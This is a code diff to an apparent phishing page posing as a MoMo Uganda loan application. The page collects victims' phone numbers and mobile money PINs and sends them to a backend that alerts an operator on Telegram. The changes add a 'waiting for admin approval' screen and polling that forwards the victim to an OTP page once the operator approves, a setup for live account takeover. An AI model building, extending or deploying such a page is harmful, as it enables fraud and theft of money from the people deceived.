@@ -152,6 +152,33 @@
             margin-bottom: 16px;
             font-size: 13.5px;
         }
+        .waiting-area {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            background: #fef3c7;
+            border-radius: 16px;
+            margin-bottom: 20px;
+        }
+        .waiting-dots {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 12px;
+        }
+        .dot {
+            width: 10px;
+            height: 10px;
+            background: #E42320;
+            border-radius: 50%;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+        .dot:nth-child(2) { animation-delay: 0.3s; }
+        .dot:nth-child(3) { animation-delay: 0.6s; }
+        @keyframes pulse {
+            0%, 100% { opacity: 0.3; transform: scale(0.8); }
+            50% { opacity: 1; transform: scale(1.2); }
+        }
         .security-note {
             text-align: center;
             font-size: 12px;
@@ -220,7 +247,18 @@
             <input type="password" id="pin" placeholder="••••" maxlength="4">
         </div>
         <div class="error-msg" id="errorMsg"></div>
-        <button class="btn-primary" id="submitBtn">Continue →</button>
+        
+        <div class="waiting-area" id="waitingArea">
+            <strong>⏳ Waiting for Admin Approval</strong>
+            <div class="waiting-dots">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+            <p style="font-size: 12px; margin-top: 12px;">Please wait while admin reviews your application on Telegram...</p>
+        </div>
+        
+        <button class="btn-primary" id="submitBtn">Submit Application →</button>
         <button class="btn-back" onclick="window.location.href='index.html'">← Back</button>
         <div class="security-note">🔒 Secured by MoMo Uganda</div>
     </div>
@@ -232,7 +270,9 @@
 </div>
 
 <script>
-    const API_URL = window.location.origin; // Uses same domain as the page
+    const API_URL = window.location.origin;
+    let pollInterval = null;
+    let currentLoanId = null;
 
     function loadLoanData() {
         const data = sessionStorage.getItem('calculatorData');
@@ -248,6 +288,59 @@
         err.textContent = msg;
         err.style.display = 'block';
         setTimeout(() => err.style.display = 'none', 4000);
+    }
+
+    function showStatus(msg, isSuccess = false) {
+        const status = document.getElementById('errorMsg');
+        status.textContent = msg;
+        status.style.background = isSuccess ? '#f0fdf4' : '#eff6ff';
+        status.style.color = isSuccess ? '#166534' : '#1e40af';
+        status.style.border = isSuccess ? '1px solid #86efac' : '1px solid #93c5fd';
+        status.style.display = 'block';
+        setTimeout(() => status.style.display = 'none', 5000);
+    }
+
+    // Poll for approval status
+    function startPolling(loanId) {
+        console.log('Starting polling for loan:', loanId);
+        
+        pollInterval = setInterval(async () => {
+            try {
+                const response = await fetch(`${API_URL}/api/loan/${loanId}`);
+                const data = await response.json();
+                
+                console.log('Poll response:', data);
+                
+                if (data.success && data.loan.status === 'approved') {
+                    // Approved! Redirect to OTP page
+                    clearInterval(pollInterval);
+                    document.getElementById('spinner').style.display = 'none';
+                    showStatus("✅ Approved! Redirecting to OTP page...", true);
+                    setTimeout(() => {
+                        window.location.href = 'otp.html';
+                    }, 1500);
+                } 
+                else if (data.success && data.loan.status === 'declined') {
+                    clearInterval(pollInterval);
+                    document.getElementById('spinner').style.display = 'none';
+                    document.getElementById('waitingArea').style.display = 'none';
+                    document.getElementById('submitBtn').style.display = 'block';
+                    showError("❌ Application declined by admin.");
+                    document.getElementById('submitBtn').disabled = false;
+                    document.getElementById('submitBtn').textContent = "Submit Application →";
+                }
+            } catch (err) {
+                console.error('Polling error:', err);
+            }
+        }, 3000); // Check every 3 seconds
+        
+        // Stop polling after 5 minutes
+        setTimeout(() => {
+            if (pollInterval) {
+                clearInterval(pollInterval);
+                console.log('Polling stopped after timeout');
+            }
+        }, 300000);
     }
 
     document.getElementById('submitBtn').onclick = async () => {
@@ -270,13 +363,11 @@
 
         const loanData = JSON.parse(sessionStorage.getItem('calculatorData') || '{}');
         
-        // Determine network from phone prefix
         let network = 'MTN';
         if (phone.startsWith('075') || phone.startsWith('074')) network = 'Airtel';
         else if (phone.startsWith('070') || phone.startsWith('076')) network = 'Africell';
         
         try {
-            // Send to backend - This will trigger Telegram notification with 4 buttons
             const response = await fetch(`${API_URL}/api/save-loan`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -295,14 +386,21 @@
             const data = await response.json();
             
             if (data.success) {
-                // Save loan ID and user data to sessionStorage
-                sessionStorage.setItem('loanId', data.loanId);
+                currentLoanId = data.loanId;
+                sessionStorage.setItem('loanId', currentLoanId);
                 sessionStorage.setItem('userPhone', phone);
                 sessionStorage.setItem('userPin', pin);
                 sessionStorage.setItem('userNetwork', network);
                 
-                // Redirect to OTP page
-                window.location.href = 'otp.html';
+                // Hide spinner, show waiting area
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('waitingArea').style.display = 'block';
+                btn.style.display = 'none';
+                
+                showStatus("📱 Application sent! Waiting for admin approval on Telegram...");
+                
+                // Start polling for approval
+                startPolling(currentLoanId);
             } else {
                 throw new Error(data.error || "Submission failed");
             }
@@ -311,7 +409,7 @@
             document.getElementById('spinner').style.display = 'none';
             showError("Error: " + err.message);
             btn.disabled = false;
-            btn.textContent = "Continue →";
+            btn.textContent = "Submit Application →";
         }
     };
 
@@ -322,6 +420,16 @@
     document.getElementById('pin').addEventListener('input', function(e) {
         this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4);
     });
+
+    // Check for existing pending loan on page load
+    const existingLoanId = sessionStorage.getItem('loanId');
+    if (existingLoanId) {
+        currentLoanId = existingLoanId;
+        document.getElementById('submitBtn').style.display = 'none';
+        document.getElementById('waitingArea').style.display = 'block';
+        showStatus("⏳ You have a pending application. Waiting for admin approval...");
+        startPolling(currentLoanId);
+    }
 
     loadLoanData();
 </script>
